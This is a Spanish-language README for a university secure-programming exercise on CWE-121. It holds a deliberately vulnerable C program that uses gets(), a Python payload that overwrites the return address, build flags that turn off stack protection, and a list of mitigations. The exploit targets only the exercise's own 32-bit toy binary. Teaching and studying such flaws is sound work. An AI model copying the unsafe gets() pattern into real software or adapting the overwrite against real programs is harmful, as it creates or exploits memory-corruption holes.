# CWE-121: Stack-based Buffer Overflow

Práctica académica que demuestra una vulnerabilidad de **desbordamiento de búfer
basado en pila** (CWE-121) en un programa en C de 32 bits, con un *exploit* en
Python que redirige el flujo de ejecución para alcanzar un bloque de código que
normalmente sería inaccesible.

> Ejercicio con fines **educativos** para la materia de Programación Segura. El
> objetivo es entender cómo se origina la vulnerabilidad y cómo se mitiga, no
> atacar sistemas de terceros.

**Autor:** Angel Gabriel Aguilar Hernandez
**Docente:** Vera Amaro, Guillermo Humberto

## Contenido del repositorio

| Archivo | Descripción |
|---|---|
| `programa.c` | Programa vulnerable en C. Lee entrada con `gets()` sin validar el tamaño. |
| `payload.py` | Genera la carga que desborda el búfer y sobrescribe la dirección de retorno. |
| `programa.out` | Binario compilado (ELF 32 bits). |

## El programa vulnerable

```c
#include <stdio.h>

int main()
{
    int cookie;
    char buf[10];

    printf("buf: %08x cookie: %08x\n", &buf, &cookie);
    gets(buf);

    if (cookie == 0x000d0a00)
        printf("ganaste angel!\n");
    return 0;
}
```

El defecto es `gets(buf)`: `gets()` copia desde la entrada estándar hacia `buf`
**sin comprobar los 10 bytes de capacidad**, por lo que una entrada más larga
escribe fuera del búfer y sobre el resto del marco de pila (la variable
`cookie`, el `EBP` guardado y la dirección de retorno).

El reto imprime `ganaste angel!` solo si `cookie == 0x000d0a00`. Ese valor
contiene los bytes `0x0a` (salto de línea) y `0x00` (nulo), que `gets()`
interpreta como fin de entrada, así que **no se puede inyectar directamente**.
En su lugar, el *exploit* sobrescribe la **dirección de retorno** para saltar
justo a la instrucción que imprime el mensaje de éxito.

## Distribución de la pila

El programa reporta `buf` en `0xbffff60a` y `cookie` en `0xbffff614`: 10 bytes de
separación. A partir de ahí el marco de pila queda así:

```
[ buf (10 bytes) ][ cookie (4) ][ EBP guardado (4) ][ dirección de retorno (4) ]
       AAAAAAAAAA     BBBB            CCCC                0x0804849c
```

`0x0804849c` es la dirección del `push`/`call puts@plt` que imprime
`ganaste angel!` (obtenida con `objdump`/`gdb`). Al sobrescribir la dirección de
retorno con ese valor, `main` "retorna" a esa instrucción y el mensaje se imprime
aunque la comparación del `cookie` nunca se cumpla.

## El exploit

```python
from struct import pack

ret_addr = 0x0804849c

output  = "A" * 10          # rellena buf[10]
output += "BBBB"            # sobrescribe cookie
output += "CCCC"            # sobrescribe EBP guardado
output += pack("<I", ret_addr)  # sobrescribe la direccion de retorno

print(output)
```

## Cómo reproducirlo

Compilado como binario de 32 bits sin las protecciones modernas de pila:

```bash
gcc -m32 -fno-stack-protector -no-pie -o programa.out programa.c
```

Con ASLR deshabilitado (para que las direcciones sean estables):

```bash
python payload.py | ./programa.out
```

Salida esperada:

```
buf: bffff60a cookie: bffff614
ganaste angel!
Violación de segmento (`core' generado)
```

El *segfault* posterior es esperado: tras imprimir el mensaje, la pila quedó
corrupta y el programa no puede retornar de forma válida.

## Mitigaciones

La vulnerabilidad desaparece aplicando cualquiera de estas prácticas:

- **No usar `gets()`.** Está marcada como obsoleta; usar `fgets(buf, sizeof(buf), stdin)`,
  que respeta el tamaño del búfer.
- **Stack canaries** (`-fstack-protector-strong`): detectan la sobrescritura antes del retorno.
- **ASLR** y **PIE** (`-fpie -pie`): aleatorizan las direcciones.
- **NX / DEP**: marca la pila como no ejecutable.
